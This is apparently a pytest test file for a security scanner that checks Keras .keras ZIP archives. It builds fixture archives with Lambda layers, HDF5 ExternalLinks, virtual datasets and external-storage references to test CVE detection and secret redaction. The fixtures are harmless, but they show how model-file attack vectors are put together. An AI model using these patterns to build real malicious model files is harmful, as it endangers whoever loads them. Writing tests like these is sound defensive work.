"""
Test the Keras ZIP scanner for detecting malicious Lambda layers in .keras files.

The new .keras format is a ZIP archive containing:
- config.json: Model configuration with layer definitions
- metadata.json: Model metadata
- model.weights.h5: Model weights in HDF5 format
"""

import base64
import builtins
import json
import marshal
import stat
import warnings
import zipfile
from collections.abc import Iterator
from pathlib import Path
from typing import Any
from unittest.mock import patch

import pytest

from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.core import determine_exit_code, scan_model_directory_or_file
from modelaudit.integrations.sarif_formatter import format_sarif_output
from modelaudit.scanners import keras_h5_scanner as keras_h5_scanner_module
from modelaudit.scanners import keras_utils as keras_utils_module
from modelaudit.scanners import keras_zip_scanner as keras_zip_scanner_module
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity, ScanResult
from modelaudit.scanners.keras_zip_scanner import KerasZipScanner, _has_get_file_reference
from modelaudit.scanners.pickle_scanner import PickleScanner
from modelaudit.utils.file import detection as file_detection
from modelaudit.utils.file.hdf5 import HDF5_SIGNATURE_SCAN_MAX_BYTES, hdf5_metadata_checksum
from modelaudit.utils.helpers import cache_decorator as cache_decorator_module
from tests.helpers import create_mock_onnx, prefix_mock_onnx_with_unknown_field

try:
    import h5py
except ImportError:  # pragma: no cover - optional dependency in some environments
    h5py = None


def create_configured_keras_zip(
    tmp_path: Path,
    config: Any,
    *,
    keras_version: str = "3.13.2",
    file_name: str = "model.keras",
    weights_h5_path: Path | None = None,
) -> Path:
    """Create a configurable .keras archive for regression tests."""
    keras_path = tmp_path / file_name
    with zipfile.ZipFile(keras_path, "w") as zf:
        zf.writestr("config.json", json.dumps(config))
        zf.writestr("metadata.json", json.dumps({"keras_version": keras_version}))
        if weights_h5_path is not None:
            zf.write(weights_h5_path, "model.weights.h5")
    return keras_path


def _build_test_keras_zip(config: dict[str, Any] | str, tmp_path: Path, keras_version: str) -> str:
    """Create a minimal .keras ZIP archive for CVE regression tests."""
    keras_path = tmp_path / "model.keras"
    config_json = config if isinstance(config, str) else json.dumps(config)
    with zipfile.ZipFile(keras_path, "w") as zf:
        zf.writestr("config.json", config_json)
        zf.writestr("metadata.json", json.dumps({"keras_version": keras_version}))
    return str(keras_path)


def _assert_inconclusive_keras_zip_scan(model_path: Path, reason: str, expected_check_name: str) -> None:
    result = KerasZipScanner().scan(str(model_path))

    assert result.success is False
    assert result.has_errors is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert reason in result.metadata["scan_outcome_reasons"]
    assert any(check.name == expected_check_name and check.status == CheckStatus.FAILED for check in result.checks)

    audit_result = scan_model_directory_or_file(str(model_path))
    metadata = audit_result.file_metadata[str(model_path)]

    assert audit_result.has_errors is False
    assert metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
    assert reason in metadata.get("scan_outcome_reasons")
    assert determine_exit_code(audit_result) == 2


def _assert_no_stale_inconclusive_metadata(result: ScanResult) -> None:
    assert result.success is True
    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata.get("analysis_incomplete") is not True
    assert not result.metadata.get("scan_outcome_reasons")
    for issue in result.issues:
        if issue.details.get("cve_id") == "CVE-2025-12058":
            assert issue.details.get("analysis_incomplete") is not True
            assert "scan_outcome_reason" not in issue.details


def _assert_inconclusive_keras_zip_scan_not_cached(model_path: Path, reason: str, cache_dir: Path) -> None:
    reset_cache_manager()
    try:
        first_result = scan_model_directory_or_file(
            str(model_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second_result = scan_model_directory_or_file(
            str(model_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for audit_result in (first_result, second_result):
            metadata = audit_result.file_metadata[str(model_path)]
            assert determine_exit_code(audit_result) == 2
            assert metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
            assert reason in metadata.get("scan_outcome_reasons")
            assert not any(
                issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in audit_result.issues
            )

        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_keras_zip_layer_counts_preserve_colliding_redacted_classes(tmp_path: Path) -> None:
    """Distinct model-controlled class names must not collapse into one count."""
    first_secret = "sk-proj-" + "A" * 24
    second_secret = "sk-proj-" + "B" * 24
    model_path = create_configured_keras_zip(
        tmp_path,
        {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {"class_name": f"token={first_secret}", "config": {}},
                    {"class_name": f"token={second_secret}", "config": {}},
                    {"class_name": f"token={first_secret}", "config": {}},
                ]
            },
        },
    )

    result = KerasZipScanner().scan(str(model_path))

    assert result.metadata["layer_counts"] == {"token=<redacted>": 2, "token=<redacted>[2]": 1}
    assert first_secret not in result.to_json()
    assert second_secret not in result.to_json()


def test_keras_zip_non_string_model_class_preserves_nested_cve_detection(tmp_path: Path) -> None:
    """Malformed root metadata must not suppress scanning of nested layers."""
    raw_secret = "sk-proj-CAND061ZIPMODELCLASSSECRET000000000000"
    encoded = base64.b64encode(b"lambda x: x * 2").decode()
    model_path = create_configured_keras_zip(
        tmp_path,
        {
            "class_name": {"api_key": raw_secret},
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "nested_lambda",
                        "config": {"function": [encoded, None, None]},
                    }
                ]
            },
        },
        keras_version="2.12.0",
    )

    result = KerasZipScanner().scan(str(model_path))

    type_checks = [check for check in result.checks if check.name == "Model Class Type Validation"]
    cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2024-3660"]
    assert len(type_checks) == 1
    assert len(cve_issues) == 1
    assert cve_issues[0].severity == IssueSeverity.CRITICAL
    assert result.metadata["model_class"] == "<invalid:dict>"
    assert "keras_zip_model_class_invalid_type" in result.metadata["scan_outcome_reasons"]
    assert raw_secret not in result.to_json()


def create_external_link_weights_h5(tmp_path: Path) -> Path:
    """Create a weights H5 file containing an ExternalLink to a local fixture."""
    if h5py is None:
        pytest.skip("h5py not available")

    external_source = tmp_path / "external_source.h5"
    with h5py.File(external_source, "w") as f:
        f.create_dataset("payload", data=[1.0, 2.0])

    weights_path = tmp_path / "model.weights.h5"
    with h5py.File(weights_path, "w") as f:
        f["linked_kernel"] = h5py.ExternalLink(external_source.name, "/payload")

    return weights_path


def create_external_storage_weights_h5(tmp_path: Path) -> Path:
    """Create a weights H5 file containing an HDF5 external-storage dataset."""
    if h5py is None:
        pytest.skip("h5py not available")

    raw_storage = tmp_path / "weights.raw"
    raw_storage.write_bytes(b"\x00" * 8)

    weights_path = tmp_path / "external_storage.weights.h5"
    with h5py.File(weights_path, "w") as f:
        f.create_dataset(
            "external_kernel",
            shape=(2,),
            dtype="float32",
            external=[(raw_storage.name, 0, 8)],
        )

    return weights_path


def create_cyclic_external_link_weights_h5(tmp_path: Path) -> Path:
    """Create weights with an ExternalLink plus a hard-link cycle."""
    if h5py is None:
        pytest.skip("h5py not available")

    external_source = tmp_path / "external_source.h5"
    with h5py.File(external_source, "w") as f:
        f.create_dataset("payload", data=[1.0, 2.0])

    weights_path = tmp_path / "cyclic_external_link.weights.h5"
    with h5py.File(weights_path, "w") as f:
        loop = f.create_group("loop")
        loop["self"] = loop
        f["linked_kernel"] = h5py.ExternalLink(external_source.name, "/payload")

    return weights_path


def create_cyclic_external_storage_weights_h5(tmp_path: Path) -> Path:
    """Create weights with external storage plus a hard-link cycle."""
    if h5py is None:
        pytest.skip("h5py not available")

    raw_storage = tmp_path / "weights.raw"
    raw_storage.write_bytes(b"\x00" * 8)

    weights_path = tmp_path / "cyclic_external_storage.weights.h5"
    with h5py.File(weights_path, "w") as f:
        loop = f.create_group("loop")
        loop["self"] = loop
        f.create_dataset(
            "external_kernel",
            shape=(2,),
            dtype="float32",
            external=[(raw_storage.name, 0, 8)],
        )

    return weights_path


def create_regular_weights_h5(tmp_path: Path) -> Path:
    """Create a benign embedded weights H5 file."""
    if h5py is None:
        pytest.skip("h5py not available")

    weights_path = tmp_path / "model.weights.h5"
    with h5py.File(weights_path, "w") as f:
        f.create_dataset("kernel", data=[1.0, 2.0])
    return weights_path


def create_virtual_dataset_weights_h5(tmp_path: Path) -> Path:
    """Create weights containing a virtual dataset backed by another HDF5 file."""
    if h5py is None:
        pytest.skip("h5py not available")

    layout = h5py.VirtualLayout(shape=(2,), dtype="float32")
    layout[:] = h5py.VirtualSource("virtual_source.h5", "payload", shape=(2,))
    weights_path = tmp_path / "virtual_dataset.weights.h5"
    with h5py.File(weights_path, "w", libver="latest") as f:
        f.create_virtual_dataset("virtual_kernel", layout)
    return weights_path


def _embed_plausible_hdf5_superblock(payload: bytes, signature_offset: int) -> bytes:
    """Embed a bounded v3 superblock while preserving surrounding polyglot bytes."""
    output = bytearray(payload)
    minimum_size = signature_offset + 64
    if len(output) < minimum_size:
        output.extend(bytes(minimum_size - len(output)))

    superblock = bytearray(b"\x89HDF\r\n\x1a\n\x03\x08\x08\x00")
    superblock.extend(signature_offset.to_bytes(8, "little"))
    superblock.extend(b"\xff" * 8)
    superblock.extend(len(output).to_bytes(8, "little"))
    superblock.extend((signature_offset + 48).to_bytes(8, "little"))
    superblock.extend(hdf5_metadata_checksum(bytes(superblock)).to_bytes(4, "little"))
    output[signature_offset : signature_offset + len(superblock)] = superblock
    output[signature_offset + len(superblock) : signature_offset + len(superblock) + 4] = b"OHDR"
    return bytes(output)


class TestKerasZipScanner:
    """Test the Keras ZIP scanner functionality."""

    def test_scanner_available(self):
        """Test that the scanner is available."""
        scanner = KerasZipScanner()
        assert scanner is not None
        assert scanner.name == "keras_zip"

    def test_archive_member_details_redact_model_controlled_values(self, tmp_path: Path) -> None:
        """Archive member names should remain useful without serializing embedded secrets."""
        raw_secret = "sk-proj-CAND061ZIPDETAILSECRET000000000000"
        keras_path = tmp_path / "missing_config.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("assets/public/readme.txt", "benign")
            zf.writestr(f"assets/{raw_secret}/payload.py", "print('review')")

        result = KerasZipScanner().scan(str(keras_path))
        format_checks = [check for check in result.checks if check.name == "Keras ZIP Format Check"]
        python_checks = [check for check in result.checks if check.name == "Python File Detection"]

        assert format_checks
        assert python_checks
        serialized_result = result.to_json()
        assert raw_secret not in serialized_result
        assert "assets/public/readme.txt" in format_checks[0].details["files"]
        assert any("<redacted>" in filename for filename in format_checks[0].details["files"])
        assert "<redacted>" in python_checks[0].details["filename"]

    def test_detects_cve_2026_1669_in_embedded_weights(self, tmp_path: Path) -> None:
        """Vulnerable .keras archives should warn on embedded HDF5 ExternalLink weights."""
        scanner = KerasZipScanner()
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.12.0",
            weights_h5_path=create_external_link_weights_h5(tmp_path),
        )

        result = scanner.scan(str(keras_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2026-1669"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.WARNING
        assert cve_issues[0].details["keras_version"] == "3.12.0"
        assert cve_issues[0].details["external_references"] == [
            {
                "kind": "ExternalLink",
                "hdf5_path": "/linked_kernel",
                "filename": "external_source.h5",
                "path": "/payload",
            },
        ]

    def test_redacted_local_version_still_triggers_cve_2026_1669(self, tmp_path: Path) -> None:
        """Embedded HDF5 attribution must classify the unredacted local version."""
        raw_secret = "sk-proj-CAND061ZIPH5VERSIONSECRET000000000000"
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version=f"3.12.0+{raw_secret}",
            weights_h5_path=create_external_link_weights_h5(tmp_path),
        )

        result = KerasZipScanner().scan(str(keras_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2026-1669"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.WARNING
        assert cve_issues[0].details["keras_version"] == "3.12.0+<redacted>"
        assert raw_secret not in result.to_json()

    @pytest.mark.parametrize(
        "weights_factory",
        [create_external_link_weights_h5, create_external_storage_weights_h5],
    )
    def test_embedded_hdf5_external_references_warn_despite_fixed_metadata(
        self,
        tmp_path: Path,
        weights_factory: Any,
    ) -> None:
        """Archive-controlled fixed-version metadata must not suppress embedded HDF5 references."""
        scanner = KerasZipScanner()
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.12.1",
            weights_h5_path=weights_factory(tmp_path),
        )

        result = scanner.scan(str(keras_path))
        aggregate_result = scan_model_directory_or_file(
            str(keras_path),
            config={"cache_scan_results": False},
        )

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2026-1669"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.WARNING
        assert cve_issues[0].details["keras_version"] == "3.12.1"
        assert cve_issues[0].details["parse_status"] == "metadata_non_vulnerable"
        assert cve_issues[0].details["metadata_only_assessment"] is True
        assert any(
            check.name == "HDF5 External Weight Reference Metadata Check" and check.status == CheckStatus.FAILED
            for check in result.checks
        )
        assert not any(
            check.name == "HDF5 External Weight Reference Version Check" and check.status == CheckStatus.PASSED
            for check in result.checks
        )
        assert determine_exit_code(aggregate_result) == 1

    def test_hdf5_link_traversal_detects_nested_external_link_without_following(
        self,
        tmp_path: Path,
    ) -> None:
        """Compatibility traversal must see ExternalLink entries without relying on h5py 3.11 APIs."""
        if h5py is None:
            pytest.skip("h5py not available")

        external_source = tmp_path / "external_source.h5"
        with h5py.File(external_source, "w") as f:
            f.create_dataset("payload", data=[1.0, 2.0])

        weights_path = tmp_path / "nested_external.weights.h5"
        with h5py.File(weights_path, "w") as f:
            dense_group = f.create_group("layers").create_group("dense")
            dense_group["kernel"] = h5py.ExternalLink(external_source.name, "/payload")

        with h5py.File(weights_path, "r") as h5_file:
            findings = KerasZipScanner._collect_hdf5_external_references(h5_file)

        assert findings == [
            {
                "kind": "ExternalLink",
                "hdf5_path": "/layers/dense/kernel",
                "filename": "external_source.h5",
                "path": "/payload",
            },
        ]

    def test_detects_hdf5_virtual_dataset_external_source(self, tmp_path: Path) -> None:
        """Virtual datasets must be treated as external HDF5 references."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.12.0",
            weights_h5_path=create_virtual_dataset_weights_h5(tmp_path),
        )

        result = KerasZipScanner().scan(str(keras_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2026-1669"]
        assert len(cve_issues) == 1
        assert cve_issues[0].details["external_references"] == [
            {
                "kind": "virtual_dataset",
                "hdf5_path": "/virtual_kernel",
                "sources": [{"filename": "virtual_source.h5", "dataset_path": "payload"}],
            }
        ]

    def test_same_file_hdf5_virtual_dataset_is_not_external(self, tmp_path: Path) -> None:
        """The HDF5 '.' VDS filename references the current file and must remain benign."""
        if h5py is None:
            pytest.skip("h5py not available")

        weights_path = tmp_path / "same_file_virtual_dataset.weights.h5"
        with h5py.File(weights_path, "w", libver="latest") as f:
            f.create_dataset("payload", data=[1.0])
            layout = h5py.VirtualLayout(shape=(1,), dtype="float64")
            layout[:] = h5py.VirtualSource(".", "payload", shape=(1,))
            f.create_virtual_dataset("virtual_kernel", layout)

        with h5py.File(weights_path, "r") as h5_file:
            findings = KerasZipScanner._collect_hdf5_external_references(h5_file)

        assert findings == []

    def test_same_file_virtual_source_does_not_hide_later_external_source(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Evidence caps must not stop inspection before a later external VDS source."""
        if h5py is None:
            pytest.skip("h5py not available")

        weights_path = tmp_path / "mixed_virtual_dataset.weights.h5"
        with h5py.File(weights_path, "w", libver="latest") as f:
            f.create_dataset("payload", data=[1.0, 2.0])
            layout = h5py.VirtualLayout(shape=(2,), dtype="float64")
            layout[0] = h5py.VirtualSource(".", "payload", shape=(2,))[0]
            layout[1] = h5py.VirtualSource("external_source.h5", "payload", shape=(2,))[1]
            f.create_virtual_dataset("virtual_kernel", layout)
        monkeypatch.setattr(KerasZipScanner, "MAX_HDF5_EXTERNAL_STORAGE_SEGMENT_REPORTS", 1)

        with h5py.File(weights_path, "r") as h5_file:
            findings = KerasZipScanner._collect_hdf5_external_references(h5_file)

        assert findings == [
            {
                "kind": "virtual_dataset",
                "hdf5_path": "/virtual_kernel",
                "sources": [{"filename": "external_source.h5", "dataset_path": "payload"}],
            }
        ]

    def test_hdf5_virtual_source_visit_limit_fails_closed(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A same-file VDS prefix must not hide an external source beyond the visit budget."""
        if h5py is None:
            pytest.skip("h5py not available")

        weights_path = tmp_path / "bounded_virtual_dataset.weights.h5"
        with h5py.File(weights_path, "w", libver="latest") as f:
            f.create_dataset("payload", data=[1.0, 2.0])
            layout = h5py.VirtualLayout(shape=(2,), dtype="float64")
            layout[0] = h5py.VirtualSource(".", "payload", shape=(2,))[0]
            layout[1] = h5py.VirtualSource("external_source.h5", "payload", shape=(2,))[1]
            f.create_virtual_dataset("virtual_kernel", layout)

        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            weights_h5_path=weights_path,
        )
        monkeypatch.setattr(KerasZipScanner, "MAX_HDF5_VIRTUAL_SOURCE_VISITS", 1)
        reason = "keras_zip_external_reference_analysis_limit_exceeded"

        _assert_inconclusive_keras_zip_scan(
            keras_path,
            reason,
            "Embedded HDF5 External Reference Analysis Limit",
        )

    @pytest.mark.parametrize(
        ("weights_factory", "expected_kind"),
        [
            (create_cyclic_external_link_weights_h5, "ExternalLink"),
            (create_cyclic_external_storage_weights_h5, "external_storage"),
        ],
    )
    def test_embedded_hdf5_external_references_warn_despite_hard_link_cycle(
        self,
        tmp_path: Path,
        weights_factory: Any,
        expected_kind: str,
    ) -> None:
        """Hard-link cycles must not turn embedded HDF5 external references into exit-2 scans."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.12.1",
            weights_h5_path=weights_factory(tmp_path),
        )

        result = KerasZipScanner().scan(str(keras_path))
        aggregate_result = scan_model_directory_or_file(
            str(keras_path),
            config={"cache_scan_results": False},
        )

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2026-1669"]
        assert len(cve_issues) == 1
        assert cve_issues[0].details["parse_status"] == "metadata_non_vulnerable"
        assert cve_issues[0].details["metadata_only_assessment"] is True
        assert cve_issues[0].details["external_references"][0]["kind"] == expected_kind
        assert determine_exit_code(aggregate_result) == 1

    def test_hdf5_link_traversal_fallback_identity_handles_hard_link_cycle(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Low-level HDF5 metadata failures must not break cycle-safe traversal."""
        if h5py is None:
            pytest.skip("h5py not available")

        weights_path = create_cyclic_external_link_weights_h5(tmp_path)
        monkeypatch.setattr(
            h5py.h5o,
            "get_info",
            lambda _object_id: (_ for _ in ()).throw(RuntimeError("object info unavailable")),
        )
        monkeypatch.setattr(KerasZipScanner, "MAX_HDF5_LINK_VISITS", 8)
        analysis: dict[str, Any] = {}

        with h5py.File(weights_path, "r") as h5_file:
            findings = KerasZipScanner._collect_hdf5_external_references(h5_file, analysis=analysis)

        assert findings == [
            {
                "kind": "ExternalLink",
                "hdf5_path": "/linked_kernel",
                "filename": "external_source.h5",
                "path": "/payload",
            },
        ]
        assert analysis["link_visits_truncated"] is False
        assert analysis["visited_link_count"] == 3

    def test_hdf5_link_traversal_does_not_resolve_soft_links(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """SoftLink aliases must not be dereferenced while collecting external-reference metadata."""
        if h5py is None:
            pytest.skip("h5py not available")

        external_source = tmp_path / "external_source.h5"
        with h5py.File(external_source, "w") as f:
            f.create_dataset("payload", data=[1.0, 2.0])

        weights_path = tmp_path / "soft_alias.weights.h5"
        with h5py.File(weights_path, "w") as f:
            f["external_kernel"] = h5py.ExternalLink(external_source.name, "/payload")
            f["soft_alias"] = h5py.SoftLink("/external_kernel")

        original_get = h5py.Group.get

        def guarded_get(
            self: Any,
            name: Any,
            default: Any = None,
            getclass: bool = False,
            getlink: bool = False,
        ) -> Any:
            if name == "soft_alias" and not getlink:
                raise AssertionError("SoftLink target was followed")
            return original_get(self, name, default=default, getclass=getclass, getlink=getlink)

        monkeypatch.setattr(h5py.Group, "get", guarded_get)

        with h5py.File(weights_path, "r") as h5_file:
            findings = KerasZipScanner._collect_hdf5_external_references(h5_file)

        assert findings == [
            {
                "kind": "ExternalLink",
                "hdf5_path": "/external_kernel",
                "filename": "external_source.h5",
                "path": "/payload",
            },
        ]

    def test_hdf5_external_reference_text_evidence_is_bounded(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Long HDF5 paths and link values must not create oversized finding evidence."""
        if h5py is None:
            pytest.skip("h5py not available")

        weights_path = tmp_path / "long_reference_text.weights.h5"
        with h5py.File(weights_path, "w") as f:
            nested_group = f.create_group("long_group_name")
            nested_group["long_external_link_name"] = h5py.ExternalLink(
                "long_external_filename.h5",
                "/long_external_target_path",
            )
        monkeypatch.setattr(KerasZipScanner, "MAX_HDF5_REFERENCE_TEXT_CHARS", 12)

        with h5py.File(weights_path, "r") as h5_file:
            findings = KerasZipScanner._collect_hdf5_external_references(h5_file)

        assert len(findings) == 1
        assert findings[0]["hdf5_path"] == "/long_grou..."
        assert findings[0]["hdf5_path_truncated"] is True
        assert findings[0]["filename"] == "long_exte..."
        assert findings[0]["filename_truncated"] is True
        assert findings[0]["path"] == "/long_ext..."
        assert findings[0]["path_truncated"] is True

    def test_hdf5_reference_redaction_uses_the_evidence_bound(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Large HDF5 names must not receive unbounded redaction analysis."""
        max_chars_values: list[int | None] = []

        def capture_redaction(value: str, max_chars: int | None = 500) -> str:
            max_chars_values.append(max_chars)
            return value[: max_chars or len(value)]

        monkeypatch.setattr(keras_zip_scanner_module, "redact_evidence_string", capture_redaction)

        bounded, was_truncated = KerasZipScanner._bounded_hdf5_reference_text("x" * 100_000)

        assert max_chars_values == [KerasZipScanner.MAX_HDF5_REFERENCE_TEXT_CHARS]
        assert len(bounded) == KerasZipScanner.MAX_HDF5_REFERENCE_TEXT_CHARS
        assert was_truncated is True

    def test_hdf5_external_reference_evidence_is_redacted(self, tmp_path: Path) -> None:
        """External-reference paths must not leak embedded credentials or tokens."""
        if h5py is None:
            pytest.skip("h5py not available")

        password_secret = "HDF5_PASSWORD_SECRET"
        query_secret = "HDF5_QUERY_SECRET"
        link_name_secret = "HDF5_LINK_NAME_SECRET"
        target_secret = "HDF5_TARGET_SECRET"
        storage_secret = "HDF5_STORAGE_SECRET"
        virtual_secret = "HDF5_VIRTUAL_SECRET"
        weights_path = tmp_path / "secret_reference.weights.h5"
        with h5py.File(weights_path, "w") as f:
            f[f"token={link_name_secret}"] = h5py.ExternalLink(
                f"https://alice:{password_secret}@example.test/data?token={query_secret}",
                f"/token={target_secret}",
            )
            f.create_dataset(
                "external_storage",
                shape=(1,),
                dtype="float32",
                external=[(f"token={storage_secret}.raw", 0, 4)],
            )
            virtual_layout = h5py.VirtualLayout(shape=(1,), dtype="float32")
            virtual_layout[:] = h5py.VirtualSource(f"token={virtual_secret}.h5", "payload", shape=(1,))
            f.create_virtual_dataset("virtual_dataset", virtual_layout)

        model_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            weights_h5_path=weights_path,
        )
        scanner_result = KerasZipScanner().scan(str(model_path))
        audit_result = scan_model_directory_or_file(str(model_path), cache_enabled=False)
        rendered_outputs = [
            json.dumps([check.details for check in scanner_result.checks], default=str),
            audit_result.model_dump_json(indent=2, exclude_none=True),
            format_sarif_output(audit_result, [str(model_path)]),
        ]

        for output in rendered_outputs:
            assert password_secret not in output
            assert query_secret not in output
            assert link_name_secret not in output
            assert target_secret not in output
            assert storage_secret not in output
            assert virtual_secret not in output
            assert "<redacted>" in output

    def test_hdf5_url_credentials_are_redacted_before_evidence_truncation(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Truncation inside URL userinfo must not expose a credential prefix."""
        if h5py is None:
            pytest.skip("h5py not available")

        credential_secret = "SUPER_SECRET_PASSWORD"
        weights_path = tmp_path / "truncated_secret_reference.weights.h5"
        with h5py.File(weights_path, "w") as f:
            f["external_kernel"] = h5py.ExternalLink(
                f"https://alice:{credential_secret}@example.test/data",
                "/payload",
            )
        monkeypatch.setattr(KerasZipScanner, "MAX_HDF5_REFERENCE_TEXT_CHARS", 24)

        with h5py.File(weights_path, "r") as h5_file:
            findings = KerasZipScanner._collect_hdf5_external_references(h5_file)

        assert len(findings) == 1
        assert credential_secret not in findings[0]["filename"]
        assert "SUPER_SECRET" not in findings[0]["filename"]
        assert findings[0]["filename_truncated"] is True

    def test_embedded_hdf5_external_reference_traversal_limit_fails_closed(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Bounded embedded HDF5 traversal must return exit 2 when no finding precedes the limit."""
        if h5py is None:
            pytest.skip("h5py not available")

        weights_path = tmp_path / "nested_regular.weights.h5"
        with h5py.File(weights_path, "w") as f:
            f.create_group("layers").create_group("dense").create_group("vars")

        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            weights_h5_path=weights_path,
        )
        monkeypatch.setattr(KerasZipScanner, "MAX_HDF5_LINK_VISITS", 2)

        reason = "keras_zip_external_reference_analysis_limit_exceeded"
        _assert_inconclusive_keras_zip_scan(
            keras_path,
            reason,
            "Embedded HDF5 External Reference Analysis Limit",
        )
        _assert_inconclusive_keras_zip_scan_not_cached(keras_path, reason, tmp_path / "traversal-limit-cache")

    def test_embedded_hdf5_external_reference_reports_are_bounded(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Reference evidence must stay bounded while preserving the security finding."""
        if h5py is None:
            pytest.skip("h5py not available")

        weights_path = tmp_path / "many_external_links.weights.h5"
        with h5py.File(weights_path, "w") as f:
            for index in range(3):
                f[f"linked_{index}"] = h5py.ExternalLink("missing_external_source.h5", f"/payload/{index}")

        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            weights_h5_path=weights_path,
        )
        monkeypatch.setattr(KerasZipScanner, "MAX_HDF5_EXTERNAL_REFERENCE_REPORTS", 2)

        result = KerasZipScanner().scan(str(keras_path))
        reason = "keras_zip_external_reference_analysis_limit_exceeded"
        assert reason not in result.metadata.get("scan_outcome_reasons", [])
        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2026-1669"]
        assert len(cve_issues) == 1
        assert len(cve_issues[0].details["external_references"]) == 2
        assert cve_issues[0].details["external_reference_count"] == 3
        assert cve_issues[0].details["external_references_truncated"] is True

        audit_result = scan_model_directory_or_file(str(keras_path), cache_enabled=False)
        assert determine_exit_code(audit_result) == 1

    def test_embedded_hdf5_external_storage_segment_reports_are_bounded(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """External-storage segment evidence must be capped without hiding the security risk."""
        if h5py is None:
            pytest.skip("h5py not available")

        weights_path = tmp_path / "many_external_segments.weights.h5"
        with h5py.File(weights_path, "w") as f:
            f.create_dataset(
                "external_kernel",
                shape=(3,),
                dtype="float32",
                external=[(f"weights-{index}.raw", 0, 4) for index in range(3)],
            )

        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            weights_h5_path=weights_path,
        )
        monkeypatch.setattr(KerasZipScanner, "MAX_HDF5_EXTERNAL_STORAGE_SEGMENT_REPORTS", 2)
        monkeypatch.setattr(
            h5py.Dataset,
            "external",
            property(lambda _dataset: (_ for _ in ()).throw(AssertionError("unbounded external segment read"))),
        )

        result = KerasZipScanner().scan(str(keras_path))
        reason = "keras_zip_external_reference_analysis_limit_exceeded"
        assert reason not in result.metadata.get("scan_outcome_reasons", [])
        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2026-1669"]
        assert len(cve_issues) == 1
        external_reference = cve_issues[0].details["external_references"][0]
        assert len(external_reference["segments"]) == 2
        assert external_reference["segment_count"] == 3
        assert external_reference["segments_truncated"] is True

        audit_result = scan_model_directory_or_file(str(keras_path), cache_enabled=False)
        assert determine_exit_code(audit_result) == 1

    def test_hdf5_external_storage_filename_evidence_is_bounded(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """External-storage filenames must be bounded without weakening detection."""
        if h5py is None:
            pytest.skip("h5py not available")

        raw_storage = tmp_path / "long_external_storage_filename.raw"
        raw_storage.write_bytes(b"\x00" * 4)
        weights_path = tmp_path / "long_external_storage.weights.h5"
        with h5py.File(weights_path, "w") as f:
            f.create_dataset(
                "external_kernel",
                shape=(1,),
                dtype="float32",
                external=[(raw_storage.name, 0, 4)],
            )
        monkeypatch.setattr(KerasZipScanner, "MAX_HDF5_REFERENCE_TEXT_CHARS", 12)

        with h5py.File(weights_path, "r") as h5_file:
            findings = KerasZipScanner._collect_hdf5_external_references(h5_file)

        assert len(findings) == 1
        assert findings[0]["segments"][0]["filename"] == "long_exte..."
        assert findings[0]["segments"][0]["filename_truncated"] is True

    @pytest.mark.parametrize(
        "keras_version",
        [
            "3.12.1rc1",
